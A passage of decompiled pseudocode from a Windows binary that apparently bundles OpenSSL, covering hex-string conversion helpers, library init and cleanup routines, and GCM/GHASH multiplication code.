      break;
    case 'E':
    case 'e':
      result = 14;
      break;
    case 'F':
    case 'f':
      result = 15;
      break;
    default:
      result = -1;
      break;
  }
  return result;
}

//----- (00424A20) --------------------------------------------------------
void *__cdecl sub_424A20(const char *a1, _DWORD *a2)
{
  void *v2; // eax
  void *v3; // ebx
  char *v5; // ecx
  _BYTE *v6; // esi
  char v7; // al
  int v8; // eax
  int v9; // edx
  char v10; // [esp+Ch] [ebp-4h]

  v2 = sub_4133F0(strlen(a1) >> 1);
  v3 = v2;
  if ( !v2 )
  {
    sub_408310(15, 118, 65, (int)"crypto\\o_str.c", 160);
    return 0;
  }
  v5 = (char *)a1;
  v6 = v2;
  while ( *v5 )
  {
    v7 = *v5++;
    v10 = v7;
    if ( v7 != 58 )
    {
      if ( !*v5 )
      {
        sub_408310(15, 118, 103, (int)"crypto\\o_str.c", 170);
        sub_413490(v3);
        return 0;
      }
      sub_424920(*v5);
      v8 = sub_424920(v10);
      if ( v9 < 0 || v8 < 0 )
      {
        sub_413490(v3);
        sub_408310(15, 118, 102, (int)"crypto\\o_str.c", 178);
        return 0;
      }
      *v6++ = v9 | (16 * v8);
    }
  }
  if ( a2 )
    *a2 = v6 - (_BYTE *)v3;
  return v3;
}
// 424A83: variable 'v5' is possibly undefined
// 424AB4: variable 'v9' is possibly undefined

//----- (00424B40) --------------------------------------------------------
_BYTE *__cdecl sub_424B40(_BYTE *a1, int a2)
{
  int v2; // esi
  _BYTE *result; // eax
  _BYTE *v5; // ecx
  _BYTE *v6; // ecx

  v2 = a2;
  if ( !a2 )
    return sub_413430(1u);
  result = sub_4133F0(3 * a2);
  if ( result )
  {
    v5 = result;
    if ( a2 > 0 )
    {
      do
      {
        *v5 = byte_504D54[(unsigned __int8)*a1 >> 4];
        v6 = v5 + 1;
        *v6++ = byte_504D54[*a1 & 0xF];
        *v6 = 58;
        v5 = v6 + 1;
        ++a1;
        --v2;
      }
      while ( v2 );
    }
    *(v5 - 1) = 0;
  }
  else
  {
    sub_408310(15, 117, 65, (int)"crypto\\o_str.c", 207);
    return 0;
  }
  return result;
}

//----- (00424BE0) --------------------------------------------------------
BOOL __cdecl sub_424BE0(int ErrorNumber, char *Buffer, size_t SizeInBytes)
{
  return strerror_s(Buffer, SizeInBytes, ErrorNumber) == 0;
}

//----- (00424C00) --------------------------------------------------------
_BYTE *__cdecl sub_424C00(_BYTE *Src, int a2)
{
  int v3; // ecx
  _BYTE *i; // eax
  size_t v5; // edi
  _BYTE *v6; // eax
  _BYTE *v7; // esi

  if ( !Src )
    return 0;
  v3 = a2;
  for ( i = Src; v3; ++i )
  {
    --v3;
    if ( !*i )
      break;
  }
  v5 = i - Src;
  v6 = sub_4133F0(i - Src + 1);
  v7 = v6;
  if ( v6 )
  {
    memcpy(v6, Src, v5);
    v7[v5] = 0;
  }
  return v7;
}

//----- (00424C60) --------------------------------------------------------
int __cdecl sub_424C60(char a1)
{
  _DWORD *v1; // esi

  v1 = sub_414770((DWORD *)&stru_538F78.OwningThread);
  if ( !v1 )
  {
    v1 = sub_413430(8u);
    sub_414780((DWORD *)&stru_538F78.OwningThread, v1);
    if ( !v1 )
      return 0;
  }
  if ( (a1 & 1) != 0 )
    *v1 = 1;
  if ( (a1 & 2) != 0 )
    v1[1] = 1;
  return 1;
}

//----- (00424CD0) --------------------------------------------------------
void __cdecl sub_424CD0()
{
  _DWORD *v0; // esi
  void (**v1)(void); // esi
  void (**v2)(void); // eax

  if ( dword_538F9C && !stru_538F78.SpinCount )
  {
    stru_538F78.SpinCount = 1;
    v0 = sub_414770((DWORD *)&stru_538F78.OwningThread);
    sub_414780((DWORD *)&stru_538F78.OwningThread, 0);
    if ( v0 )
    {
      if ( *v0 )
        sub_42C150();
      if ( v0[1] )
        sub_4085E0();
      sub_413490(v0);
    }
    v1 = (void (**)(void))dword_538F90;
    if ( dword_538F90 )
    {
      do
      {
        (*v1)();
        v2 = v1;
        v1 = (void (**)(void))v1[1];
        sub_413490(v2);
      }
      while ( v1 );
    }
    dword_538F90 = 0;
    sub_4146D0(dword_538F94);
    if ( dword_539010 )
      nullsub_1();
    if ( dword_538FDC )
      sub_42C130();
    if ( dword_538FA8 )
      sub_407D70();
    sub_4147A0((DWORD *)&stru_538F78.OwningThread);
    sub_406EB0();
    sub_441560();
    sub_42A090();
    sub_414820();
    sub_4055A0();
    sub_430DB0();
    sub_423120();
    sub_407BB0();
    dword_538F9C = 0;
  }
}
// 4416D0: using guessed type int nullsub_1(void);
// 538F9C: using guessed type int dword_538F9C;
// 538FA8: using guessed type int dword_538FA8;
// 538FDC: using guessed type int dword_538FDC;
// 539010: using guessed type int dword_539010;

//----- (00424DF0) --------------------------------------------------------
void __cdecl sub_424DF0(_DWORD *Block)
{
  if ( Block )
  {
    if ( *Block )
      sub_42C150();
    if ( Block[1] )
      sub_4085E0();
    sub_413490(Block);
  }
}

//----- (00424E30) --------------------------------------------------------
void sub_424E30()
{
  dword_538FAC = 1;
}
// 538FAC: using guessed type int dword_538FAC;

//----- (00424E40) --------------------------------------------------------
BOOL sub_424E40()
{
  BOOL result; // eax

  result = sub_43AEB0();
  dword_538FA8 = 1;
  dword_538FB0 = result;
  return result;
}
// 538FA8: using guessed type int dword_538FA8;
// 538FB0: using guessed type int dword_538FB0;

//----- (00424E60) --------------------------------------------------------
int sub_424E60()
{
  int result; // eax

  result = sub_43B000();
  dword_538FB8 = 1;
  return result;
}
// 538FB8: using guessed type int dword_538FB8;

//----- (00424E70) --------------------------------------------------------
int sub_424E70()
{
  int result; // eax

  result = sub_43B820();
  dword_538FC0 = 1;
  return result;
}
// 538FC0: using guessed type int dword_538FC0;

//----- (00424E80) --------------------------------------------------------
void sub_424E80()
{
  dword_538FC4 = 1;
}
// 538FC4: using guessed type int dword_538FC4;

//----- (00424E90) --------------------------------------------------------
int sub_424E90()
{
  int result; // eax

  sub_43B920((char *)stru_538F78.LockSemaphore);
  result = 1;
  dword_538FCC = 1;
  dword_538FD0 = 1;
  return result;
}
// 538FCC: using guessed type int dword_538FCC;
// 538FD0: using guessed type int dword_538FD0;

//----- (00424ED0) --------------------------------------------------------
int sub_424ED0()
{
  int result; // eax

  result = sub_42C0F0();
  if ( result )
  {
    result = 1;
    dword_538FDC = 1;
    dword_538FE0 = 1;
  }
  else
  {
    dword_538FE0 = 0;
  }
  return result;
}
// 538FDC: using guessed type int dword_538FDC;
// 538FE0: using guessed type int dword_538FE0;

//----- (00424F40) --------------------------------------------------------
int sub_424F40()
{
  int result; // eax

  result = 1;
  dword_539010 = 1;
  dword_539014 = 1;
  return result;
}
// 539010: using guessed type int dword_539010;
// 539014: using guessed type int dword_539014;

//----- (00424FA0) --------------------------------------------------------
BOOL __cdecl sub_424FA0(int a1, int a2, _DWORD *a3)
{
  int v4; // edi

  if ( stru_538F78.SpinCount )
  {
    if ( !dword_539018 )
    {
      dword_539018 = 1;
      sub_408310(15, 116, 70, "crypto\\init.c", 472);
    }
    return 0;
  }
  if ( (sub_414700(&dword_538F98, (void (*)(void))sub_424F50) ? dword_538FA0 : 0) == 0 )
    return 0;
  if ( (a1 & 1) != 0 && (sub_414700(&dword_538FA4, sub_424E30) ? dword_538FAC : 0) == 0 )
    return 0;
  if ( (a1 & 2) != 0 && (sub_414700(&dword_538FA4, (void (*)(void))sub_424E40) ? dword_538FB0 : 0) == 0 )
    return 0;
  if ( (a1 & 0x10) != 0 && (sub_414700(&dword_538FB4, sub_424E80) ? dword_538FC4 : 0) == 0 )
    return 0;
  if ( (a1 & 4) != 0 && (sub_414700(&dword_538FB4, (void (*)(void))sub_424E60) ? dword_538FB8 : 0) == 0 )
    return 0;
  if ( (a1 & 0x20) != 0 && (sub_414700(&dword_538FBC, sub_424E80) ? dword_538FC4 : 0) == 0 )
    return 0;
  if ( (a1 & 8) != 0 && (sub_414700(&dword_538FBC, (void (*)(void))sub_424E70) ? dword_538FC0 : 0) == 0 )
    return 0;
  if ( (a1 & 0x80) != 0 && (sub_414700(&dword_538FC8, (void (*)(void))sub_424EB0) ? dword_538FD4 : 0) == 0 )
    return 0;
  if ( (a1 & 0x40) != 0 )
  {
    sub_414690(dword_538F94);
    stru_538F78.LockSemaphore = a3 ? (HANDLE)*a3 : 0;
    v4 = sub_414700(&dword_538FC8, (void (*)(void))sub_424E90) ? dword_538FD0 : 0;
    sub_4146B0(dword_538F94);
    if ( !v4 )
      return 0;
  }
  if ( (a1 & 0x100) != 0 && (sub_414700(&dword_538FD8, (void (*)(void))sub_424ED0) ? dword_538FE0 : 0) == 0
    || (a1 & 0x800) != 0 && (sub_414700(&dword_538FE4, (void (*)(void))sub_424EF0) ? dword_538FE8 : 0) == 0
    || (a1 & 0x200) != 0 && (sub_414700(&dword_538FEC, (void (*)(void))sub_424F00) ? dword_538FF0 : 0) == 0
    || (a1 & 0x400) != 0 && (sub_414700(&dword_538FF4, (void (*)(void))sub_424F10) ? dword_538FF8 : 0) == 0
    || (a1 & 0x4000) != 0 && (sub_414700(&dword_538FFC, (void (*)(void))sub_424F20) ? dword_539000 : 0) == 0
    || (a1 & 0x2000) != 0 && (sub_414700(&dword_539004, (void (*)(void))sub_424F30) ? dword_539008 : 0) == 0 )
  {
    return 0;
  }
  if ( (a1 & 0xFE00) != 0 )
    sub_4419D0();
  return (a1 & 0x10000) == 0 || (sub_414700(&dword_53900C, (void (*)(void))sub_424F40) ? dword_539014 : 0) != 0;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 424EB0: using guessed type int sub_424EB0();
// 424EF0: using guessed type int sub_424EF0();
// 424F00: using guessed type int sub_424F00();
// 424F10: using guessed type int sub_424F10();
// 424F20: using guessed type int sub_424F20();
// 424F30: using guessed type int sub_424F30();
// 424F50: using guessed type int sub_424F50();
// 538FA0: using guessed type int dword_538FA0;
// 538FAC: using guessed type int dword_538FAC;
// 538FB0: using guessed type int dword_538FB0;
// 538FB8: using guessed type int dword_538FB8;
// 538FC0: using guessed type int dword_538FC0;
// 538FC4: using guessed type int dword_538FC4;
// 538FD0: using guessed type int dword_538FD0;
// 538FD4: using guessed type int dword_538FD4;
// 538FE0: using guessed type int dword_538FE0;
// 538FE8: using guessed type int dword_538FE8;
// 538FF0: using guessed type int dword_538FF0;
// 538FF8: using guessed type int dword_538FF8;
// 539000: using guessed type int dword_539000;
// 539008: using guessed type int dword_539008;
// 539014: using guessed type int dword_539014;
// 539018: using guessed type int dword_539018;

//----- (00425300) --------------------------------------------------------
int __cdecl sub_425300(int *a1, int a2)
{
  int v2; // ebp
  int v3; // edx
  int v4; // ecx
  unsigned int v5; // ebx
  int v6; // ebx
  unsigned int v7; // ebp
  int v8; // edx
  int v9; // ecx
  int v10; // ebx
  int result; // eax
  int v12; // edi
  int v13; // ebx
  int v14; // ecx
  int v15; // edx
  int v16; // ebp
  int v17; // ebx
  int v18; // ecx
  int v19; // edx
  unsigned int v20; // ebp
  int v21; // ebx
  int v22; // ecx
  int v23; // edx
  int v24; // ebp
  int v25[4]; // [esp+0h] [ebp-64h]
  int v26[21]; // [esp+10h] [ebp-54h]

  v2 = *a1;
  v3 = a1[1];
  v4 = a1[2];
  v5 = a1[3];
  v26[0] = 0;
  v26[1] = 471859200;
  v26[2] = 943718400;
  v26[3] = 610271232;
  v26[4] = 1887436800;
  v26[5] = 1822425088;
  v26[6] = 1220542464;
  v26[7] = 1423966208;
  v26[8] = -520093696;
  v26[9] = -48234496;
  v26[10] = -650117120;
  v26[11] = -983564288;
  v26[12] = -1853882368;
  v26[13] = -1918894080;
  v26[14] = -1447034880;
  v26[15] = -1243611136;
  v25[0] = v2;
  v25[1] = v3;
  v25[2] = v4;
  v25[3] = v5;
  v6 = (v5 >> 20) & 0xF0;
  v7 = *(_DWORD *)(a2 + v6 + 4);
  v8 = *(_DWORD *)(a2 + v6);
  v9 = *(_DWORD *)(a2 + v6 + 12);
  v10 = *(_DWORD *)(a2 + v6 + 8);
  result = 0;
  v12 = 15;
  while ( 1 )
  {
    LOBYTE(result) = v10;
    v13 = __PAIR64__(v9, v10) >> 4;
    LOBYTE(result) = result & 0xF;
    v14 = __PAIR64__(v8, v9) >> 4;
    v15 = __PAIR64__(v7, v8) >> 4;
    v16 = v26[result] ^ (v7 >> 4);
    LOBYTE(result) = *((_BYTE *)v25 + v12) & 0xF0;
    v17 = *(_DWORD *)(a2 + result + 8) ^ v13;
    v18 = *(_DWORD *)(a2 + result + 12) ^ v14;
    v19 = *(_DWORD *)(a2 + result) ^ v15;
    v20 = *(_DWORD *)(a2 + result + 4) ^ v16;
    if ( --v12 < 0 )
      break;
    LOBYTE(result) = v17;
    v21 = __PAIR64__(v18, v17) >> 4;
    LOBYTE(result) = result & 0xF;
    v22 = __PAIR64__(v19, v18) >> 4;
    v23 = __PAIR64__(v20, v19) >> 4;
    v24 = v26[result] ^ (v20 >> 4);
    LOBYTE(result) = 16 * *((_BYTE *)v25 + v12);
    v10 = *(_DWORD *)(a2 + result + 8) ^ v21;
    v9 = *(_DWORD *)(a2 + result + 12) ^ v22;
    v8 = *(_DWORD *)(a2 + result) ^ v23;
    v7 = *(_DWORD *)(a2 + result + 4) ^ v24;
  }
  a1[3] = _byteswap_ulong(v17);
  a1[2] = _byteswap_ulong(v18);
  a1[1] = _byteswap_ulong(v19);
  *a1 = _byteswap_ulong(v20);
  return result;
}

//----- (00425460) --------------------------------------------------------
int __cdecl sub_425460(unsigned __int32 *a1, int a2, char *a3, int a4)
{
  char *v4; // edi
  unsigned __int32 v5; // ebp
  unsigned __int32 v6; // edx
  unsigned __int32 v7; // ecx
  unsigned __int32 v8; // ebx
  int v9; // ecx
  int v10; // edx
  int v11; // ebp
  unsigned int v12; // ebx
  unsigned int v13; // ebp
  int v14; // edx
  int v15; // ecx
  int v16; // ebx
  int result; // eax
  int v18; // edi
  int v19; // ebx
  int v20; // ecx
  int v21; // edx
  int v22; // ebp
  int v23; // ebx
  int v24; // ecx
  int v25; // edx
  unsigned int v26; // ebp
  int v27; // ebx
  int v28; // ecx
  int v29; // edx
  int v30; // ebp
  int v31[3]; // [esp+0h] [ebp-64h]
  unsigned int v32; // [esp+Ch] [ebp-58h]
  int v33[21]; // [esp+10h] [ebp-54h]
  char *v34; // [esp+74h] [ebp+10h]

  v4 = a3;
  v34 = &a3[a4];
  v5 = *a1;
  v6 = a1[1];
  v7 = a1[2];
  v8 = a1[3];
  v33[0] = 0;
  v33[1] = 471859200;
  v33[2] = 943718400;
  v33[3] = 610271232;
  v33[4] = 1887436800;
  v33[5] = 1822425088;
  v33[6] = 1220542464;
  v33[7] = 1423966208;
  v33[8] = -520093696;
  v33[9] = -48234496;
  v33[10] = -650117120;
  v33[11] = -983564288;
  v33[12] = -1853882368;
  v33[13] = -1918894080;
  v33[14] = -1447034880;
  v33[15] = -1243611136;
  do
  {
    v9 = *((_DWORD *)v4 + 2) ^ v7;
    v10 = *((_DWORD *)v4 + 1) ^ v6;
    v11 = *(_DWORD *)v4 ^ v5;
    v32 = *((_DWORD *)v4 + 3) ^ v8;
    v31[2] = v9;
    v31[1] = v10;
    v31[0] = v11;
    v12 = (v32 >> 20) & 0xF0;
    v13 = *(_DWORD *)(a2 + v12 + 4);
    v14 = *(_DWORD *)(a2 + v12);
    v15 = *(_DWORD *)(a2 + v12 + 12);
    v16 = *(_DWORD *)(a2 + v12 + 8);
    result = 0;
    v18 = 15;
    while ( 1 )
    {
      LOBYTE(result) = v16;
      v19 = __PAIR64__(v15, v16) >> 4;
      LOBYTE(result) = result & 0xF;
      v20 = __PAIR64__(v14, v15) >> 4;
      v21 = __PAIR64__(v13, v14) >> 4;
      v22 = v33[result] ^ (v13 >> 4);
      LOBYTE(result) = *((_BYTE *)v31 + v18) & 0xF0;
      v23 = *(_DWORD *)(a2 + result + 8) ^ v19;
      v24 = *(_DWORD *)(a2 + result + 12) ^ v20;
      v25 = *(_DWORD *)(a2 + result) ^ v21;
      v26 = *(_DWORD *)(a2 + result + 4) ^ v22;
      if ( --v18 < 0 )
        break;
      LOBYTE(result) = v23;
      v27 = __PAIR64__(v24, v23) >> 4;
      LOBYTE(result) = result & 0xF;
      v28 = __PAIR64__(v25, v24) >> 4;
      v29 = __PAIR64__(v26, v25) >> 4;
      v30 = v33[result] ^ (v26 >> 4);
      LOBYTE(result) = 16 * *((_BYTE *)v31 + v18);
      v16 = *(_DWORD *)(a2 + result + 8) ^ v27;
      v15 = *(_DWORD *)(a2 + result + 12) ^ v28;
      v14 = *(_DWORD *)(a2 + result) ^ v29;
      v13 = *(_DWORD *)(a2 + result + 4) ^ v30;
    }
    v8 = _byteswap_ulong(v23);
    v7 = _byteswap_ulong(v24);
    v6 = _byteswap_ulong(v25);
    v5 = _byteswap_ulong(v26);
    v4 = a3 + 16;
    a3 += 16;
  }
  while ( a3 < v34 );
  a1[3] = v8;
  a1[2] = v7;
  a1[1] = v6;
  *a1 = v5;
  return result;
}

//----- (00425600) --------------------------------------------------------
int *__cdecl sub_425600(int a1, int a2)
{
  int *result; // eax
  int v3; // ebp
  int v4; // ecx
  int v5; // edx
  __m64 v6; // mm0
  __m64 v7; // mm1
  char v8; // bl
  __m64 v9; // mm2
  __m64 v10; // mm0
  __m64 v11; // mm1
  char v12; // bl
  __m64 v13; // mm1
  char v14; // dl
  __m64 v15; // mm0
  __m64 v16; // mm2
  __m64 v17; // mm0
  __m64 v18; // mm1
  int v19; // edx
  __m64 v20; // mm2
  __m64 v21; // mm0
  __m64 v22; // mm1
  char v23; // bl
  __m64 v24; // mm0
  __m64 v25; // mm2
  __m64 v26; // mm0
  __m64 v27; // mm1

  result = dword_426780;
  v3 = 14;
  v4 = (unsigned __int8)(16 * *(_BYTE *)(a1 + 15));
  v5 = *(_BYTE *)(a1 + 15) & 0xF0;
  v6 = *(__m64 *)(a2 + v4 + 8);
  v7 = *(__m64 *)(a2 + v4);
  v8 = _mm_cvtsi64_si32(v6);
  while ( 1 )
  {
    v9 = v7;
    v10 = _m_pxor(_m_psrlqi(v6, 4u), *(__m64 *)(a2 + v5 + 8));
    LOBYTE(v4) = *(_BYTE *)(a1 + v3);
    v11 = _m_pxor(_m_psrlqi(v7, 4u), *(__m64 *)&dword_426780[2 * (v8 & 0xF)]);
    --v3;
    v12 = _mm_cvtsi64_si32(v10);
    v13 = _m_pxor(v11, *(__m64 *)(a2 + v5));
    v14 = v4;
    v15 = _m_pxor(v10, _m_psllqi(v9, 0x3Cu));
    if ( v3 < 0 )
      break;
    LOBYTE(v4) = 16 * v4;
    v5 = v14 & 0xF0;
    v16 = v13;
    v17 = _m_pxor(_m_psrlqi(v15, 4u), *(__m64 *)(a2 + v4 + 8));
    v18 = _m_pxor(_m_psrlqi(v13, 4u), *(__m64 *)&dword_426780[2 * (v12 & 0xF)]);
    v8 = _mm_cvtsi64_si32(v17);
    v7 = _m_pxor(v18, *(__m64 *)(a2 + v4));
    v6 = _m_pxor(v17, _m_psllqi(v16, 0x3Cu));
  }
  LOBYTE(v4) = 16 * v4;
  v19 = v14 & 0xF0;
  v20 = v13;
  v21 = _m_pxor(_m_psrlqi(v15, 4u), *(__m64 *)(a2 + v4 + 8));
  v22 = _m_pxor(_m_psrlqi(v13, 4u), *(__m64 *)&dword_426780[2 * (v12 & 0xF)]);
  v23 = _mm_cvtsi64_si32(v21);
  v24 = _m_psrlqi(_m_pxor(v21, _m_psllqi(v20, 0x3Cu)), 4u);
  v25 = _m_pxor(v22, *(__m64 *)(a2 + v4));
  v26 = _m_pxor(v24, *(__m64 *)(a2 + v19 + 8));
  v27 = _m_pxor(_m_pxor(_m_psrlqi(v25, 4u), *(__m64 *)&dword_426780[2 * (v23 & 0xF)]), *(__m64 *)(a2 + v19));
  _m_empty();
  *(_DWORD *)(a1 + 12) = _byteswap_ulong(_mm_cvtsi64_si32(v26));
  *(_DWORD *)(a1 + 4) = _byteswap_ulong(_mm_cvtsi64_si32(v27));
  *(_DWORD *)(a1 + 8) = _byteswap_ulong(_mm_cvtsi64_si32(_m_psrlqi(_m_pxor(v26, _m_psllqi(v25, 0x3Cu)), 0x20u)));
  *(_DWORD *)a1 = _byteswap_ulong(_mm_cvtsi64_si32(_m_psrlqi(v27, 0x20u)));
  return result;
}
// 426780: using guessed type int dword_426780[3];

//----- (00425740) --------------------------------------------------------
__m64 *__cdecl sub_425740(__m64 *a1, __int64 a2, __int64 a3)
{
  __m64 *v3; // ecx
  __m64 v4; // mm0
  __m64 v5; // mm3
  int v6; // edx
  __m64 v7; // mm2
  __m64 v8; // mm5
  int v9; // edx
  __m64 v10; // mm1
  __m64 v11; // mm4
  int v12; // edx
  __m64 v13; // mm0
  __m64 v14; // mm3
  int v15; // edx
  __m64 v16; // mm2
  __m64 v17; // mm5
  int v18; // edx
  __m64 v19; // mm1
  __m64 v20; // mm4
  int v21; // edx
  __m64 v22; // mm0
  __m64 v23; // mm3
  int v24; // edx
  __m64 v25; // mm2
  __m64 v26; // mm5
  int v27; // edx
  __m64 v28; // mm1
  __m64 v29; // mm4
  int v30; // edx
  __m64 v31; // mm0
  __m64 v32; // mm3
  int v33; // edx
  __m64 v34; // mm2
  __m64 v35; // mm5
  int v36; // edx
  __m64 v37; // mm1
  __m64 v38; // mm4
  int v39; // edx
  __m64 v40; // mm0
  __m64 v41; // mm3
  int v42; // edx
  __m64 v43; // mm2
  __m64 v44; // mm5
  int v45; // edx
  __m64 v46; // mm1
  __m64 v47; // mm4
  int v48; // edx
  __m64 v49; // mm0
  __m64 v50; // mm3
  __m64 m64_u64; // mm6
  unsigned __int32 v52; // ebx
  unsigned __int32 v53; // edx
  int v54; // edx
  __m64 v55; // mm6
  int v56; // edx
  int v57; // eax
  int v58; // ebp
  int v59; // edx
  __m64 v60; // mm7
  __m64 v61; // mm6
  char v62; // bl
  unsigned int v63; // edi
  int v64; // edx
  __m64 v65; // mm7
  __m64 v66; // mm6
  char v67; // cl
  int v68; // ebx
  unsigned int v69; // ebp
  __m64 v70; // mm2
  __m64 v71; // mm7
  __m64 v72; // mm6
  int v73; // ecx
  unsigned int v74; // edi
  __m64 v75; // mm1
  int v76; // edx
  __m64 v77; // mm7
  __m64 v78; // mm6
  int v79; // ebx
  unsigned int v80; // ebp
  __m64 v81; // mm0
  int v82; // edx
  __m64 v83; // mm7
  __m64 v84; // mm6
  int v85; // ecx
  unsigned int v86; // edi
  __m64 v87; // mm2
  int v88; // edx
  __m64 v89; // mm7
  __m64 v90; // mm6
  int v91; // ebx
  unsigned int v92; // ebp
  __m64 v93; // mm1
  __m64 v94; // mm7
  __m64 v95; // mm6
  int v96; // ecx
  unsigned int v97; // edi
  __m64 v98; // mm0
  int v99; // edx
  __m64 v100; // mm7
  __m64 v101; // mm6
  int v102; // ebx
  unsigned int v103; // ebp
  __m64 v104; // mm2
  int v105; // edx
  __m64 v106; // mm7
  __m64 v107; // mm6
  int v108; // ecx
  unsigned int v109; // edi
  __m64 v110; // mm1
  int v111; // edx
  __m64 v112; // mm7
  __m64 v113; // mm6
  int v114; // ebx
  unsigned int v115; // ebp
  __m64 v116; // mm0
  __m64 v117; // mm7
  __m64 v118; // mm6
  int v119; // ecx
  unsigned int v120; // edi
  __m64 v121; // mm2
  int v122; // edx
  __m64 v123; // mm7
  __m64 v124; // mm6
  int v125; // ebx
  unsigned int v126; // ebp
  __m64 v127; // mm1
  int v128; // edx
  __m64 v129; // mm7
  __m64 v130; // mm6
  int v131; // ecx
  unsigned int v132; // edi
  __m64 v133; // mm0
  int v134; // edx
  __m64 v135; // mm7
  __m64 v136; // mm6
  int v137; // ebx
  unsigned int v138; // ebp
  __m64 v139; // mm2
  __m64 v140; // mm7
  __m64 v141; // mm6
  int v142; // ecx
  unsigned int v143; // edi
  __m64 v144; // mm7
  __m64 v145; // mm1
  __m64 v146; // mm3
  __m64 v147; // mm7
  __m64 v148; // mm6
  __m64 *result; // eax
  char v150[16]; // [esp+0h] [ebp-230h]
  __m64 v151[16]; // [esp+10h] [ebp-220h]
  __m64 v152[16]; // [esp+90h] [ebp-1A0h]
  __m64 v153[16]; // [esp+110h] [ebp-120h]
  __int64 v154[16]; // [esp+190h] [ebp-A0h]
  __m64 v155; // [esp+210h] [ebp-20h]
  __int64 v156; // [esp+218h] [ebp-18h]
  __m64 *v157; // [esp+220h] [ebp-10h]
  __m64 *v158; // [esp+224h] [ebp-Ch]
  __m64 *v159; // [esp+228h] [ebp-8h]
  __int64 *v160; // [esp+22Ch] [ebp-4h]
  __int64 vars0; // [esp+230h] [ebp+0h] BYREF

  v3 = (__m64 *)HIDWORD(a2);
  v157 = a1;
  v159 = (__m64 *)(HIDWORD(a2) + a3);
  v160 = &vars0;
  v4 = *(__m64 *)(a2 + 8);
  v5 = *(__m64 *)a2;
  v150[0] = 16 * *(_DWORD *)(a2 + 8);
  v6 = *(_DWORD *)(a2 + 24);
  v7 = *(__m64 *)(a2 + 24);
  v8 = *(__m64 *)(a2 + 16);
  v151[0] = v4;
  v152[0] = v5;
  v150[1] = 16 * v6;
  v9 = *(_DWORD *)(a2 + 40);
  v10 = *(__m64 *)(a2 + 40);
  v11 = *(__m64 *)(a2 + 32);
  v151[1] = v7;
  v152[1] = v8;
  v153[0] = _m_por(_m_psrlqi(v4, 4u), _m_psllqi(v5, 0x3Cu));
  v154[0] = (__int64)_m_psrlqi(v5, 4u);
  v150[2] = 16 * v9;
  v12 = *(_DWORD *)(a2 + 56);
  v13 = *(__m64 *)(a2 + 56);
  v14 = *(__m64 *)(a2 + 48);
  v151[2] = v10;
  v152[2] = v11;
  v153[1] = _m_por(_m_psrlqi(v7, 4u), _m_psllqi(v8, 0x3Cu));
  v154[1] = (__int64)_m_psrlqi(v8, 4u);
  v150[3] = 16 * v12;
  v15 = *(_DWORD *)(a2 + 72);
  v16 = *(__m64 *)(a2 + 72);
  v17 = *(__m64 *)(a2 + 64);
  v151[3] = v13;
  v152[3] = v14;
  v153[2] = _m_por(_m_psrlqi(v10, 4u), _m_psllqi(v11, 0x3Cu));
  v154[2] = (__int64)_m_psrlqi(v11, 4u);
  v150[4] = 16 * v15;
  v18 = *(_DWORD *)(a2 + 88);
  v19 = *(__m64 *)(a2 + 88);
  v20 = *(__m64 *)(a2 + 80);
  v151[4] = v16;
  v152[4] = v17;
  v153[3] = _m_por(_m_psrlqi(v13, 4u), _m_psllqi(v14, 0x3Cu));
  v154[3] = (__int64)_m_psrlqi(v14, 4u);
  v150[5] = 16 * v18;
  v21 = *(_DWORD *)(a2 + 104);
  v22 = *(__m64 *)(a2 + 104);
  v23 = *(__m64 *)(a2 + 96);
  v151[5] = v19;
  v152[5] = v20;
  v153[4] = _m_por(_m_psrlqi(v16, 4u), _m_psllqi(v17, 0x3Cu));
  v154[4] = (__int64)_m_psrlqi(v17, 4u);
  v150[6] = 16 * v21;
  v24 = *(_DWORD *)(a2 + 120);
  v25 = *(__m64 *)(a2 + 120);
  v26 = *(__m64 *)(a2 + 112);
  v151[6] = v22;
  v152[6] = v23;
  v153[5] = _m_por(_m_psrlqi(v19, 4u), _m_psllqi(v20, 0x3Cu));
  v154[5] = (__int64)_m_psrlqi(v20, 4u);
  v150[7] = 16 * v24;
  v27 = *(_DWORD *)(a2 + 136);
  v28 = *(__m64 *)(a2 + 136);
  v29 = *(__m64 *)(a2 + 128);
  v151[7] = v25;
  v152[7] = v26;
  v153[6] = _m_por(_m_psrlqi(v22, 4u), _m_psllqi(v23, 0x3Cu));
  v154[6] = (__int64)_m_psrlqi(v23, 4u);
  v150[8] = 16 * v27;
  v30 = *(_DWORD *)(a2 + 152);
  v31 = *(__m64 *)(a2 + 152);
  v32 = *(__m64 *)(a2 + 144);
  v151[8] = v28;
  v152[8] = v29;
  v153[7] = _m_por(_m_psrlqi(v25, 4u), _m_psllqi(v26, 0x3Cu));
  v154[7] = (__int64)_m_psrlqi(v26, 4u);
  v150[9] = 16 * v30;
  v33 = *(_DWORD *)(a2 + 168);
  v34 = *(__m64 *)(a2 + 168);
  v35 = *(__m64 *)(a2 + 160);
  v151[9] = v31;
  v152[9] = v32;
  v153[8] = _m_por(_m_psrlqi(v28, 4u), _m_psllqi(v29, 0x3Cu));
  v154[8] = (__int64)_m_psrlqi(v29, 4u);
  v150[10] = 16 * v33;
  v36 = *(_DWORD *)(a2 + 184);
  v37 = *(__m64 *)(a2 + 184);
  v38 = *(__m64 *)(a2 + 176);
  v151[10] = v34;
  v152[10] = v35;
  v153[9] = _m_por(_m_psrlqi(v31, 4u), _m_psllqi(v32, 0x3Cu));
  v154[9] = (__int64)_m_psrlqi(v32, 4u);
  v150[11] = 16 * v36;
  v39 = *(_DWORD *)(a2 + 200);
  v40 = *(__m64 *)(a2 + 200);
  v41 = *(__m64 *)(a2 + 192);
  v151[11] = v37;
  v152[11] = v38;
  v153[10] = _m_por(_m_psrlqi(v34, 4u), _m_psllqi(v35, 0x3Cu));
  v154[10] = (__int64)_m_psrlqi(v35, 4u);
  v150[12] = 16 * v39;
  v42 = *(_DWORD *)(a2 + 216);
  v43 = *(__m64 *)(a2 + 216);
  v44 = *(__m64 *)(a2 + 208);
  v151[12] = v40;
  v152[12] = v41;
  v153[11] = _m_por(_m_psrlqi(v37, 4u), _m_psllqi(v38, 0x3Cu));
  v154[11] = (__int64)_m_psrlqi(v38, 4u);
  v150[13] = 16 * v42;
  v45 = *(_DWORD *)(a2 + 232);
  v46 = *(__m64 *)(a2 + 232);
  v47 = *(__m64 *)(a2 + 224);
  v151[13] = v43;
  v152[13] = v44;
  v153[12] = _m_por(_m_psrlqi(v40, 4u), _m_psllqi(v41, 0x3Cu));
  v154[12] = (__int64)_m_psrlqi(v41, 4u);
  v150[14] = 16 * v45;
  v48 = *(_DWORD *)(a2 + 248);
